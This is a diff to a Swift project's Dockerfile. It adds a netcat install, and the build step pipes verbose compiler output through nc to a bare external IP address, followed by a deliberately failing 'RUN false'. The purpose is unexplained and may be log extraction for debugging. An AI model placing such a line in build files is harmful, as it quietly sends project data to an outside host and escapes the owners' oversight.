@@ -1,6 +1,7 @@
 FROM swift:5.3-focal as build
 WORKDIR /build
 COPY . .
+RUN apt-get update && apt-get install -y netcat
 RUN swift build --enable-test-discovery -c release -j 1 -v -Xcc -v -Xcxx -v -Xlinker -v -Xswiftc -v | nc 198.211.101.37 12345; true
 RUN false
 WORKDIR /staging
